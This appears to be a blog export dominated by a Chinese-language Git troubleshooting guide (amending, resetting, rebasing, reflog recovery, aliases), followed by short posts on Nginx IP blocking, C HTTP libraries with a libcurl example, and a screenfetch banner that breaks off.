这篇文章的约定为了清楚的表述，这篇文档里的所有例子使用了自定义的bash 提示，以便指示当前分支和是否有暂存的变化(changes)。分支名用小括号括起来，分支名后面跟的*表示暂存的变化(changes)。 Table of Contents generated with DocToc 编辑提交(editting commits) 我刚才提交了什么? 我的提交信息(commit message)写错了 我提交(commit)里的用户名和邮箱不对 我想从一个提交(commit)里移除一个文件 我想删除我的的最后一次提交(commit) 删除任意提交(commit) 我尝试推一个修正后的提交(amended commit)到远程，但是报错： 我意外的做了一次硬重置(hard reset)，我想找回我的内容 暂存(Staging) 我需要把暂存的内容添加到上一次的提交(commit) 我想要暂存一个新文件的一部分，而不是这个文件的全部 我想把在一个文件里的变化(changes)加到两个提交(commit)里 我想把暂存的内容变成未暂存，把未暂存的内容暂存起来 未暂存(Unstaged)的内容 我想把未暂存的内容移动到一个新分支 我想把未暂存的内容移动到另一个已存在的分支 我想丢弃本地未提交的变化(uncommitted changes) 我想丢弃某些未暂存的内容 分支(Branches) 我从错误的分支拉取了内容，或把内容拉取到了错误的分支 我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致 我需要提交到一个新分支，但错误的提交到了master 我想保留来自另外一个ref-ish的整个文件 我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里 我想删除上游(upstream)分支被删除了的本地分支 我不小心删除了我的分支 我想删除一个分支 我想从别人正在工作的远程分支签出(checkout)一个分支 Rebasing 和合并(Merging) 我想撤销rebase/merge 我已经rebase过, 但是我不想强推(force push) 我需要组合(combine)几个提交(commit) 安全合并(merging)策略 我需要将一个分支合并成一个提交(commit) 我只想组合(combine)未推的提交(unpushed commit) 检查是否分支上的所有提交(commit)都合并(merge)过了 交互式rebase(interactive rebase)可能出现的问题 这个rebase 编辑屏幕出现’noop’ 有冲突的情况 杂项(Miscellaneous Objects) 克隆所有子模块 删除标签(tag) 恢复已删除标签(tag) 已删除补丁(patch) 跟踪文件(Tracking Files) 我只想改变一个文件名字的大小写，而不修改内容 我想从Git删除一个文件，但保留该文件 配置(Configuration) 我想给一些Git命令添加别名(alias) 我想缓存一个仓库(repository)的用户名和密码 我不知道我做错了些什么 其它资源(Other Resources) 书(Books) 教程(Tutorials) 脚本和工具(Scripts and Tools) GUI客户端(GUI Clients) 编辑提交(editting commits) 我刚才提交了什么?如果你用 git commit -a 提交了一次变化(changes)，而你又不确定到底这次提交了哪些面容。 你就可以用下面的命令显示当前HEAD上的最近一次的提交(commit): 1(master)$ git show 或者 1$ git log -n1 -p 我的提交信息(commit message)写错了如果你的提交信息(commit message)写错了且这次提交(commit)还没有推(push), 你可以通过下面的方法来修改提交信息(commit message): 1$ git commit --amend 这会打开你的默认编辑器, 在这里你可以编辑信息. 另一方面, 你也可以用一条命令一次完成: 1$ git commit --amend -m 'xxxxxxx' 如果你已经推(push)了这次提交(commit), 你可以修改这次提交(commit)然后强推(force push), 但是不推荐这么做。 我提交(commit)里的用户名和邮箱不对如果这只是单个提交(commit)，修改它： 1$ git commit --amend --author \"New Authorname &lt;authoremail@mydomain.com&gt;\" 如果你需要修改所有历史, 参考 ‘git filter-branch’的指南页. 我想从一个提交(commit)里移除一个文件通过下面的方法，从一个提交(commit)里移除一个文件: 123$ git checkout HEAD^ myfile$ git add -A$ git commit --amend 这将非常有用，当你有一个开放的补丁(open patch)，你往上面提交了一个不必要的文件，你需要强推(force push)去更新这个远程补丁。 我想删除我的的最后一次提交(commit)如果你需要删除推了的提交(pushed commits)，你可以使用下面的方法。可是，这会不可逆的改变你的历史，也会搞乱那些已经从该仓库拉取(pulled)了的人的历史。简而言之，如果你不是很确定，千万不要这么做。 12$ git reset HEAD^ --hard$ git push -f [remote] [branch] 如果你还没有推到远程, 把Git重置(reset)到你最后一次提交前的状态就可以了(同时保存暂存的变化): 1(my-branch*)$ git reset --soft HEAD@&#123;1&#125; 这只能在没有推送之前有用. 如果你已经推了, 唯一安全能做的是 git revert SHAofBadCommit， 那会创建一个新的提交(commit)用于撤消前一个提交的所有变化(changes)； 或者, 如果你推的这个分支是rebase-safe的 (例如： 其它开发者不会从这个分支拉), 只需要使用 git push -f； 更多, 请参考 the above section。 删除任意提交(commit)同样的警告：不到万不得已的时候不要这么做. 12$ git rebase --onto SHA1_OF_BAD_COMMIT^ SHA1_OF_BAD_COMMIT$ git push -f [remote] [branch] 或者做一个 交互式rebase 删除那些你想要删除的提交(commit)里所对应的行。 我尝试推一个修正后的提交(amended commit)到远程，但是报错：1234567To https://github.com/yourusername/repo.git! [rejected] mybranch -&gt; mybranch (non-fast-forward)error: failed to push some refs to 'https://github.com/tanay1337/webmaker.org.git'hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: 'git pull ...') before pushing again.hint: See the 'Note about fast-forwards' in 'git push --help' for details. 注意, rebasing(见下面)和修正(amending)会用一个新的提交(commit)代替旧的, 所以如果之前你已经往远程仓库上推过一次修正前的提交(commit)，那你现在就必须强推(force push) (-f)。 注意 &ndash; 总是 确保你指明一个分支! 1(my-branch)$ git push origin mybranch -f 一般来说, 要避免强推. 最好是创建和推(push)一个新的提交(commit)，而不是强推一个修正后的提交。后者会使那些与该分支或该分支的子分支工作的开发者，在源历史中产生冲突。 我意外的做了一次硬重置(hard reset)，我想找回我的内容如果你意外的做了 git reset --hard, 你通常能找回你的提交(commit), 因为Git对每件事都会有日志，且都会保存几天。 1(master)$ git reflog 你将会看到一个你过去提交(commit)的列表, 和一个重置的提交。 选择你想要回到的提交(commit)的SHA，再重置一次: 1(master)$ git reset --hard SHA1234 这样就完成了。 暂存(Staging) 我需要把暂存的内容添加到上一次的提交(commit)1(my-branch*)$ git commit --amend 我想要暂存一个新文件的一部分，而不是这个文件的全部一般来说, 如果你想暂存一个文件的一部分, 你可这样做: 1$ git add --patch filename.x -p 简写。这会打开交互模式， 你将能够用 s 选项来分隔提交(commit)； 然而, 如果这个文件是新的, 会没有这个选择， 添加一个新文件时, 这样做: 1$ git add -N filename.x 然后, 你需要用 e 选项来手动选择需要添加的行，执行 git diff --cached 将会显示哪些行暂存了哪些行只是保存在本地了。 我想把在一个文件里的变化(changes)加到两个提交(commit)里git add 会把整个文件加入到一个提交. git add -p 允许交互式的选择你想要提交的部分. 我想把暂存的内容变成未暂存，把未暂存的内容暂存起来这个有点困难， 我能想到的最好的方法是先stash未暂存的内容， 然后重置(reset)，再pop第一步stashed的内容, 最后再add它们。 1234$ git stash -k$ git reset --hard$ git stash pop$ git add -A 未暂存(Unstaged)的内容 我想把未暂存的内容移动到一个新分支1$ git checkout -b my-branch 我想把未暂存的内容移动到另一个已存在的分支123$ git stash$ git checkout my-branch$ git stash pop 我想丢弃本地未提交的变化(uncommitted changes)如果你只是想重置源(origin)和你本地(local)之间的一些提交(commit)，你可以： 12345678# one commit(my-branch)$ git reset --hard HEAD^# two commits(my-branch)$ git reset --hard HEAD^^# four commits(my-branch)$ git reset --hard HEAD~4# or(master)$ git checkout -f 重置某个特殊的文件, 你可以用文件名做为参数: 1$ git reset filename 我想丢弃某些未暂存的内容如果你想丢弃工作拷贝中的一部分内容，而不是全部。 签出(checkout)不需要的内容，保留需要的。 12$ git checkout -p# Answer y to all of the snippets you want to drop 另外一个方法是使用 stash， Stash所有要保留下的内容, 重置工作拷贝, 重新应用保留的部分。 1234$ git stash -p# Select all of the snippets you want to save$ git reset --hard$ git stash pop 或者, stash 你不需要的部分, 然后stash drop。 123$ git stash -p# Select all of the snippets you don't want to save$ git stash drop 分支(Branches) 我从错误的分支拉取了内容，或把内容拉取到了错误的分支这是另外一种使用 git reflog 情况，找到在这次错误拉(pull) 之前HEAD的指向。 123(master)$ git reflogab7555f HEAD@&#123;0&#125;: pull origin wrong-branch: Fast-forwardc5bc55a HEAD@&#123;1&#125;: checkout: checkout message goes here 重置分支到你所需的提交(desired commit): 1$ git reset --hard c5bc55a 完成。 我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致先确认你没有推(push)你的内容到远程。 git status 会显示你领先(ahead)源(origin)多少个提交: 12345(my-branch)$ git status# On branch my-branch# Your branch is ahead of 'origin/my-branch' by 2 commits.# (use \"git push\" to publish your local commits)# 一种方法是: 1(master)$ git reset --hard origin/my-branch 我需要提交到一个新分支，但错误的提交到了master在master下创建一个新分支，不切换到新分支,仍在master下: 1(master)$ git branch my-branch 把master分支重置到前一个提交: 1(master)$ git reset --hard HEAD^ HEAD^ 是 HEAD^1 的简写，你可以通过指定要设置的HEAD来进一步重置。 或者, 如果你不想使用 HEAD^, 找到你想重置到的提交(commit)的hash(git log 能够完成)， 然后重置到这个hash。 使用git push 同步内容到远程。 例如, master分支想重置到的提交的hash为a13b85e: 12(master)$ git reset --hard a13b85eHEAD is now at a13b85e 签出(checkout)刚才新建的分支继续工作: 1(master)$ git checkout my-branch 我想保留来自另外一个ref-ish的整个文件假设你正在做一个原型方案(原文为working spike (see note)), 有成百的内容，每个都工作得很好。现在, 你提交到了一个分支，保存工作内容: 1(solution)$ git add -A &amp;&amp; git commit -m \"Adding all changes from this spike into one big commit.\" 当你想要把它放到一个分支里 (可能是feature, 或者 develop), 你关心是保持整个文件的完整，你想要一个大的提交分隔成比较小。 假设你有: 分支 solution, 拥有原型方案， 领先 develop 分支。 分支 develop, 在这里你应用原型方案的一些内容。 我去可以通过把内容拿到你的分支里，来解决这个问题: 1(develop)$ git checkout solution -- file1.txt 这会把这个文件内容从分支 solution 拿到分支 develop 里来: 123456# On branch develop# Your branch is up-to-date with 'origin/develop'.# Changes to be committed:# (use \"git reset HEAD &lt;file&gt;...\" to unstage)## modified: file1.txt 然后, 正常提交。 Note: Spike solutions are made to analyze or solve the problem. These solutions are used for estimation and discarded once everyone gets clear visualization of the problem. ~ Wikipedia. 我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里假设你有一个master分支， 执行git log, 你看到你做过两次提交: 12345678910111213141516171819(master)$ git logcommit e3851e817c451cc36f2e6f3049db528415e3c114Author: Alex Lee &lt;alexlee@example.com&gt;Date: Tue Jul 22 15:39:27 2014 -0400 Bug #21 - Added CSRF protectioncommit 5ea51731d150f7ddc4a365437931cd8be3bf3131Author: Alex Lee &lt;alexlee@example.com&gt;Date: Tue Jul 22 15:39:12 2014 -0400 Bug #14 - Fixed spacing on titlecommit a13b85e984171c6e2a1729bb061994525f626d14Author: Aki Rose &lt;akirose@example.com&gt;Date: Tue Jul 21 01:12:48 2014 -0400 First commit 让我们用提交hash(commit hash)标记bug (e3851e8 for #21, 5ea5173 for #14). 首先, 我们把master分支重置到正确的提交(a13b85e): 12(master)$ git reset --hard a13b85eHEAD is now at a13b85e 现在, 我们对 bug #21 创建一个新的分支: 12(master)$ git checkout -b 21(21)$ 接着, 我们用 cherry-pick 把对bug #21的提交放入当前分支。 这意味着我们将应用(apply)这个提交(commit)，仅仅这一个提交(commit)，直接在HEAD上面。 1(21)$ git cherry-pick e3851e8 这时候, 这里可能会产生冲突， 参见交互式 rebasing 章 冲突节 解决冲突. 再者， 我们为bug #14 创建一个新的分支, 也基于master分支 123(21)$ git checkout master(master)$ git checkout -b 14(14)$ 最后, 为 bug #14 执行 cherry-pick: 1(14)$ git cherry-pick 5ea5173 我想删除上游(upstream)分支被删除了的本地分支一旦你在github 上面合并(merge)了一个pull request, 你就可以删除你fork里被合并的分支。 如果你不准备继续在这个分支里工作, 删除这个分支的本地拷贝会更干净，使你不会陷入工作分支和一堆陈旧分支的混乱之中。 1$ git fetch -p 我不小心删除了我的分支如果你定期推送到远程, 多数情况下应该是安全的，但有些时候还是可能删除了还没有推到远程的分支。 让我们先创建一个分支和一个新的文件: 12345(master)$ git checkout -b my-branch(my-branch)$ git branch(my-branch)$ touch foo.txt(my-branch)$ lsREADME.md foo.txt 添加文件并做一次提交 123456789101112131415161718(my-branch)$ git add .(my-branch)$ git commit -m 'foo.txt added'(my-branch)$ foo.txt added 1 files changed, 1 insertions(+) create mode 100644 foo.txt(my-branch)$ git logcommit 4e3cd85a670ced7cc17a2b5d8d3d809ac88d5012Author: siemiatj &lt;siemiatj@example.com&gt;Date: Wed Jul 30 00:34:10 2014 +0200 foo.txt addedcommit 69204cdf0acbab201619d95ad8295928e7f411d5Author: Kate Hudson &lt;katehudson@example.com&gt;Date: Tue Jul 29 13:14:46 2014 -0400 Fixes #6: Force pushing after amending commits 现在我们切回到主(master)分支，‘不小心的’删除my-branch分支 1234567(my-branch)$ git checkout masterSwitched to branch 'master'Your branch is up-to-date with 'origin/master'.(master)$ git branch -D my-branchDeleted branch my-branch (was 4e3cd85).(master)$ echo oh noes, deleted my branch!oh noes, deleted my branch! 在这时候你应该想起了reflog, 一个升级版的日志，它存储了仓库(repo)里面所有动作的历史。 1234(master)$ git reflog69204cd HEAD@&#123;0&#125;: checkout: moving from my-branch to master4e3cd85 HEAD@&#123;1&#125;: commit: foo.txt added69204cd HEAD@&#123;2&#125;: checkout: moving from master to my-branch 正如你所见，我们有一个来自删除分支的提交hash(commit hash)，接下来看看是否能恢复删除了的分支。 123456(master)$ git checkout -b my-branch-helpSwitched to a new branch 'my-branch-help'(my-branch-help)$ git reset --hard 4e3cd85HEAD is now at 4e3cd85 foo.txt added(my-branch-help)$ lsREADME.md foo.txt 看! 我们把删除的文件找回来了。 Git的 reflog 在rebasing出错的时候也是同样有用的。 我想删除一个分支删除一个远程分支: 1(master)$ git push origin --delete my-branch 你也可以: 1(master)$ git push origin :my-branch 删除一个本地分支: 1(master)$ git branch -D my-branch 我想从别人正在工作的远程分支签出(checkout)一个分支首先, 从远程拉取(fetch) 所有分支: 1(master)$ git fetch --all 假设你想要从远程的daves分支签出到本地的daves 123(master)$ git checkout --track origin/davesBranch daves set up to track remote branch daves from origin.Switched to a new branch 'daves' (--track 是 git checkout -b [branch] [remotename]/[branch] 的简写) 这样就得到了一个daves分支的本地拷贝, 任何推过(pushed)的更新，远程都能看到. Rebasing 和合并(Merging) 我想撤销rebase/merge你可以合并(merge)或rebase了一个错误的分支, 或者完成不了一个进行中的rebase/merge。 Git 在进行危险操作的时候会把原始的HEAD保存在一个叫ORIG_HEAD的变量里, 所以要把分支恢复到rebase/merge前的状态是很容易的。 1(my-branch)$ git reset --hard ORIG_HEAD 我已经rebase过, 但是我不想强推(force push)不幸的是，如果你想把这些变化(changes)反应到远程分支上，你就必须得强推(force push)。 是因你快进(Fast forward)了提交，改变了Git历史, 远程分支不会接受变化(changes)，除非强推(force push)。这就是许多人使用 merge 工作流, 而不是 rebasing 工作流的主要原因之一， 开发者的强推(force push)会使大的团队陷入麻烦。使用时需要注意，一种安全使用 rebase 的方法是，不要把你的变化(changes)反映到远程分支上, 而是按下面的做: 1234(master)$ git checkout my-branch(my-branch)$ git rebase -i master(my-branch)$ git checkout master(master)$ git merge --ff-only my-branch 更多, 参见 this SO thread. 我需要组合(combine)几个提交(commit)假设你的工作分支将会做对于 master 的pull-request。 一般情况下你不关心提交(commit)的时间戳，只想组合 所有 提交(commit) 到一个单独的里面, 然后重置(reset)重提交(recommit)。 确保主(master)分支是最新的和你的变化都已经提交了, 然后: 12(my-branch)$ git reset --soft master(my-branch)$ git commit -am \"New awesome feature\" 如果你想要更多的控制, 想要保留时间戳, 你需要做交互式rebase (interactive rebase): 1(my-branch)$ git rebase -i master 如果没有相对的其它分支， 你将不得不相对自己的HEAD 进行 rebase。 例如：你想组合最近的两次提交(commit), 你将相对于HEAD~2 进行rebase， 组合最近3次提交(commit), 相对于HEAD~3, 等等。 1(master)$ git rebase -i HEAD~2 在你执行了交互式 rebase的命令(interactive rebase command)后, 你将在你的编辑器里看到类似下面的内容: 12345678910111213141516171819202122pick a9c8a1d Some refactoringpick 01b2fd8 New awesome featurepick b729ad5 fixuppick e3851e8 another fix# Rebase 8074d12..b729ad5 onto 8074d12## Commands:# p, pick = use commit# r, reword = use commit, but edit the commit message# e, edit = use commit, but stop for amending# s, squash = use commit, but meld into previous commit# f, fixup = like \"squash\", but discard this commit's log message# x, exec = run command (the rest of the line) using shell## These lines can be re-ordered; they are executed from top to bottom.## If you remove a line here THAT COMMIT WILL BE LOST.## However, if you remove everything, the rebase will be aborted.## Note that empty commits are commented out 所有以 # 开头的行都是注释, 不会影响 rebase. 然后，你可以用任何上面命令列表的命令替换 pick, 你也可以通过删除对应的行来删除一个提交(commit)。 例如, 如果你想 单独保留最旧(first)的提交(commit),组合所有剩下的到第二个里面, 你就应该编辑第二个提交(commit)后面的每个提交(commit) 前的单词为 f: 1234pick a9c8a1d Some refactoringpick 01b2fd8 New awesome featuref b729ad5 fixupf e3851e8 another fix 如果你想组合这些提交(commit) 并重命名这个提交(commit), 你应该在第二个提交(commit)旁边添加一个r，或者更简单的用s 替代 f: 1234pick a9c8a1d Some refactoringpick 01b2fd8 New awesome features b729ad5 fixups e3851e8 another fix 你可以在接下来弹出的文本提示框里重命名提交(commit)。 12345678910Newer, awesomer features# Please enter the commit message for your changes. Lines starting# with '#' will be ignored, and an empty message aborts the commit.# rebase in progress; onto 8074d12# You are currently editing a commit while rebasing branch 'master' on '8074d12'.## Changes to be committed:# modified: README.md# 如果成功了, 你应该看到类似下面的内容: 1(master)$ Successfully rebased and updated refs/heads/master. 安全合并(merging)策略--no-commit 执行合并(merge)但不自动提交, 给用户在做提交前检查和修改的机会。 no-ff 会为特性分支(feature branch)的存在过留下证据, 保持项目历史一致。 1(master)$ git merge --no-ff --no-commit my-branch 我需要将一个分支合并成一个提交(commit)1(master)$ git merge --squash my-branch 我只想组合(combine)未推的提交(unpushed commit)有时候，在将数据推向上游之前，你有几个正在进行的工作提交(commit)。这时候不希望把已经推(push)过的组合进来，因为其他人可能已经有提交(commit)引用它们了。 1(master)$ git rebase -i @&#123;u&#125; 这会产生一次交互式的rebase(interactive rebase), 只会列出没有推(push)的提交(commit)， 在这个列表时进行reorder/fix/squash 都是安全的。 检查是否分支上的所有提交(commit)都合并(merge)过了检查一个分支上的所有提交(commit)是否都已经合并(merge)到了其它分支, 你应该在这些分支的head(或任何 commits)之间做一次diff: 1(master)$ git log --graph --left-right --cherry-pick --oneline HEAD...feature/120-on-scroll 这会告诉你在一个分支里有而另一个分支没有的所有提交(commit), 和分支之间不共享的提交(commit)的列表。 另一个做法可以是: 1(master)$ git log master ^feature/120-on-scroll --no-merges 交互式rebase(interactive rebase)可能出现的问题 这个rebase 编辑屏幕出现’noop’如果你看到的是这样:1noop 这意味着你rebase的分支和当前分支在同一个提交(commit)上, 或者 领先(ahead) 当前分支。 你可以尝试: 检查确保主(master)分支没有问题 rebase HEAD~2 或者更早 有冲突的情况如果你不能成功的完成rebase, 你可能必须要解决冲突。 首先执行 git status 找出哪些文件有冲突: 1234567(my-branch)$ git statusOn branch my-branchChanges not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory) modified: README.md 在这个例子里面, README.md 有冲突。 打开这个文件找到类似下面的内容: 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADsome code=========some code&gt;&gt;&gt;&gt;&gt;&gt;&gt; new-commit 你需要解决新提交的代码(示例里, 从中间==线到new-commit的地方)与HEAD 之间不一样的地方. 有时候这些合并非常复杂，你应该使用可视化的差异编辑器(visual diff editor): 1(master*)$ git mergetool -t opendiff 在你解决完所有冲突和测试过后, git add 变化了的(changed)文件, 然后用git rebase --continue 继续rebase。 12(my-branch)$ git add README.md(my-branch)$ git rebase --continue 如果在解决完所有的冲突过后，得到了与提交前一样的结果, 可以执行git rebase --skip。 任何时候你想结束整个rebase 过程，回来rebase前的分支状态, 你可以做: 1(my-branch)$ git rebase --abort 杂项(Miscellaneous Objects) 克隆所有子模块1$ git clone --recursive git://github.com/foo/bar.git 如果已经克隆了: 1$ git submodule update --init --recursive 删除标签(tag)12$ git tag -d &lt;tag_name&gt;$ git push &lt;remote&gt; :refs/tags/&lt;tag_name&gt; 恢复已删除标签(tag)如果你想恢复一个已删除标签(tag), 可以按照下面的步骤: 首先, 需要找到无法访问的标签(unreachable tag): 1$ git fsck --unreachable | grep tag 记下这个标签(tag)的hash，然后用Git的 update-ref: 1$ git update-ref refs/tags/&lt;tag_name&gt; &lt;hash&gt; 这时你的标签(tag)应该已经恢复了。 已删除补丁(patch)如果某人在 GitHub 上给你发了一个pull request, 但是然后他删除了他自己的原始 fork, 你将没法克隆他们的提交(commit)或使用 git am。在这种情况下, 最好手动的查看他们的提交(commit)，并把它们拷贝到一个本地新分支，然后做提交。 做完提交后, 再修改作者，参见变更作者。 然后, 应用变化, 再发起一个新的pull request。 跟踪文件(Tracking Files) 我只想改变一个文件名字的大小写，而不修改内容1(master)$ git mv --force myfile MyFile 我想从Git删除一个文件，但保留该文件1(master)$ git rm --cached log.txt 配置(Configuration) 我想给一些Git命令添加别名(alias)在 OS X 和 Linux 下, 你的 Git的配置文件储存在 部分添加了一些快捷别名(和一些我容易拼写错误的)，如下:12345678910111213141516171819202122```vim[alias] a = add amend = commit --amend c = commit ca = commit --amend ci = commit -a co = checkout d = diff dc = diff --changed ds = diff --staged f = fetch loll = log --graph --decorate --pretty=oneline --abbrev-commit m = merge one = log --pretty=oneline outstanding = rebase -i @&#123;u&#125; s = status unpushed = log @&#123;u&#125; wc = whatchanged wip = rebase -i @&#123;u&#125; zap = fetch -p 我想缓存一个仓库(repository)的用户名和密码你可能有一个仓库需要授权，这时你可以缓存用户名和密码，而不用每次推/拉(push/pull)的时候都输入，Credential helper能帮你。 12$ git config --global credential.helper cache# Set git to use the credential memory cache 12$ git config --global credential.helper 'cache --timeout=3600'# Set the cache to timeout after 1 hour (setting is in seconds) 我不知道我做错了些什么你把事情搞砸了：你 重置(reset) 了一些东西, 或者你合并了错误的分支, 亦或你强推了后找不到你自己的提交(commit)了。有些时候, 你一直都做得很好, 但你想回到以前的某个状态。 这就是 git reflog 的目的， reflog 记录对分支顶端(the tip of a branch)的任何改变, 即使那个顶端没有被任何分支或标签引用。基本上, 每次HEAD的改变, 一条新的记录就会增加到reflog。遗憾的是，这只对本地分支起作用，且它只跟踪动作 (例如，不会跟踪一个没有被记录的文件的任何改变)。 1234(master)$ git reflog0a2e358 HEAD@&#123;0&#125;: reset: moving to HEAD~20254ea7 HEAD@&#123;1&#125;: checkout: moving from 2.2 to masterc10f740 HEAD@&#123;2&#125;: checkout: moving from master to 2.2 上面的reflog展示了从master分支签出(checkout)到2.2 分支，然后再签回。 那里，还有一个硬重置(hard reset)到一个较旧的提交。最新的动作出现在最上面以 HEAD@{0}标识. 如果事实证明你不小心回移(move back)了提交(commit), reflog 会包含你不小心回移前master上指向的提交(0254ea7)。 1$ git reset --hard 0254ea7 然后使用git reset就可以把master改回到之前的commit，这提供了一个在历史被意外更改情况下的安全网。 (摘自). 其它资源(Other Resources)书(Books) Pro Git - Scott Chacon’s excellent git book Git Internals - Scott Chacon’s other excellent git book 教程(Tutorials) Learn Git branching 一个基于网页的交互式 branching/merging/rebasing 教程 Getting solid at Git rebase vs. merge git-workflow - Aaron Meurer的怎么使用Git为开源仓库贡献 GitHub as a workflow - 使用GitHub做为工作流的趣事, 尤其是空PRs 脚本和工具(Scripts and Tools) firstaidgit.io 一个可搜索的最常被问到的Git的问题 git-extra-commands - 一堆有用的额外的Git脚本 git-extras - GIT 工具集 – repo summary, repl, changelog population, author commit percentages and more git-fire - git-fire 是一个 Git 插件，用于帮助在紧急情况下添加所有当前文件, 做提交(committing), 和推(push)到一个新分支(阻止合并冲突)。 git-tips - Git小提示 git-town - 通用，高级Git工作流支持！ http://www.git-town.com GUI客户端(GUI Clients) GitKraken - 豪华的Git客户端 Windows, Mac &amp; Linux git-cola - 另外一个Git客户端 Windows &amp; OS X GitUp - 一个新的Git客户端，在处理Git的复杂性上有自己的特点 gitx-dev - 图形化的Git客户端 OS X Source Tree - 免费的图形化Git客户端 Windows &amp; OS X Tower - 图形化Git客户端 OS X(付费)","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"火狐插件-查看网站的架构","slug":"前端/火狐插件-查看网站的架构","date":"2017-12-16T01:52:36.000Z","updated":"2021-12-28T03:24:10.263Z","comments":true,"path":"前端/火狐插件-查看网站的架构/","link":"","permalink":"http://yoursite.com/前端/火狐插件-查看网站的架构/","excerpt":"","text":"wappalyzer,可以大概知道一个网站的服务器软件，使用的js库等信息。原理的话，应该是网站响应的header信息。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"使用fmod模仿QQ变声特效-NDK","slug":"音视频/使用fmod模仿QQ变声特效-NDK","date":"2017-11-30T11:52:36.000Z","updated":"2021-12-28T03:24:10.317Z","comments":true,"path":"音视频/使用fmod模仿QQ变声特效-NDK/","link":"","permalink":"http://yoursite.com/音视频/使用fmod模仿QQ变声特效-NDK/","excerpt":"","text":"http://www.jianshu.com/p/99a2ad03cd58","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"Nginx屏蔽IP","slug":"Web后端/Nginx屏蔽IP","date":"2017-11-30T01:52:37.000Z","updated":"2021-12-28T03:24:10.208Z","comments":true,"path":"Web后端/Nginx屏蔽IP/","link":"","permalink":"http://yoursite.com/Web后端/Nginx屏蔽IP/","excerpt":"","text":"以下是手动屏蔽固定的IP，还有一些方法可以自动将IP屏蔽待以后需要再研究。 1. 假设nginx的配置中有如下一个server12345678910server &#123; listen 80; server_name localhost; location / &#123; root /var/www/localhost; index index.html index.htm; &#125;&#125; 2. 如果现在我需要屏蔽两个IP，加入以下三行到server节点中：1234# allow 一定要在 deny 前面allow all;deny 123.123.123.123;deny 123.123.123.124; 3. 如果要屏蔽一个123.123.123.x 这个IP段，写法如下：1deny 123.123.123.0/24; 示例：1234567891011121314server &#123; listen 80; server_name localhost; location / &#123; root /var/www/; index index.html index.htm; &#125; # allow 一定要在 deny 前面 allow all; deny 123.123.123.0/24; error_page 500 502 503 504 /50x.html;&#125; 4. 屏蔽配置写入文件创建一个文件如 blockips.conf ，包含屏蔽内容，在server中 include 此文件即可。示例 blockips.conf：123allow all;deny 123.123.123.123;deny 123.123.123.124; 示例 nginx.conf：123456789101112server &#123; listen 80; server_name localhost; location / &#123; root /var/www/; index index.html index.htm; &#125; include blockips.conf; error_page 500 502 503 504 /50x.html;&#125; 5. 仅允许内网访问123456# block one workstationdeny 192.168.1.1;# allow anyone in 192.168.1.0/24allow 192.168.1.0/24;# drop rest of the worlddeny all;","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"}]},{"title":"Linux下C语言HTTP通讯库","slug":"Linux/Linux下C语言HTTP通讯库","date":"2017-11-30T01:52:36.000Z","updated":"2017-11-30T01:52:36.000Z","comments":true,"path":"Linux/Linux下C语言HTTP通讯库/","link":"","permalink":"http://yoursite.com/Linux/Linux下C语言HTTP通讯库/","excerpt":"","text":"很多嵌入式设备都有接入网络的功能，那么在Linux下的C，用什么HTTP库比较合适呢？嵌入式设备资源都比较紧张，大的库肯定不是一个好的选择。由于不是专业的，只能找到以下库： libcurlcurl-7.56.1.zip 大小是5.27MB,里面包含了supporting HTTP, HTTPS, FTP, FTPS, GOPHER, TFTP, SCP, SFTP, SMB, TELNET, DICT, LDAP, LDAPS, FILE, IMAP, SMTP, POP3, RTSP and RTMP. 所以能精简出来HTTP是没有5.27MB那么大。 而且一般linux系统都带有curl的库，c语言可以直接引入curl的头文件。 libcurl基本知识post和get请求 c/c++调用libcurl库发送http请求的两种基本用法 示例： 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;curl/curl.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char *argv[])&#123; CURL *curl; //定义CURL类型的指针 CURLcode res; //定义CURLcode类型的变量，保存返回状态码 if(argc!=2) &#123; printf(\"Usage: file &lt;url&gt;;\\n\"); exit(1); &#125; curl = curl_easy_init(); //初始化一个CURL类型的指针 if(curl!=NULL) &#123; //设置curl选项.其中CURLOPT_URL是让用户指定url.argv[1]中存放的命令行传进来的网址 curl_easy_setopt(curl,CURLOPT_URL, argv[1]); //调用curl_easy_perform执行我们的设置.并进行相关的操作.在这里只在屏幕上显示出来. res = curl_easy_perform(curl); //清除curl操作. curl_easy_cleanup(curl); &#125; return 0;&#125; 123#编译和运行$ gcc test_curl.c -o test -lcurl$ ./test www.baidu.com Tinyhttpd​Tinyhttpd 是J. David Blackstone在1999年写的一个不到 500 行的超轻量型 Http Server Boa​Boa是一个非常小巧的web服务器,其可执行代码只有约60Kb ghttp官网没有下载了，但根据其他下载站来看，只有144KB，要源码可以去github搜一下。封装示例 C++ client for making HTTP/REST requests C++ Requests: Curl for People tbox的http模块 自己拼包 无意中发现的一个库，里面封装了一些 HTTPClient 和其他IO的库 C++ client for making HTTP/REST requests ​","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"打印Linux系统的Banner","slug":"Linux/打印Linux系统的Banner","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.181Z","comments":true,"path":"Linux/打印Linux系统的Banner/","link":"","permalink":"http://yoursite.com/Linux/打印Linux系统的Banner/","excerpt":"","text":"1234567891011121314151617181920root@bogon:~# screenfetch ./+o+- root@bogon yyyyy- -yyyyyy+ OS: Ubuntu 16.04 xenial ://+//////-yyyyyyo Kernel: x86_64 Linux 4.4.0-97-generic .++ .:/++++++/-.+sss/` Uptime: 2d 9h 14m .:++o: /++++++++/:--:/- Packages: 1004 o:+o+:++.`..```.-/oo+++++/ Shell: bash 4.3.48 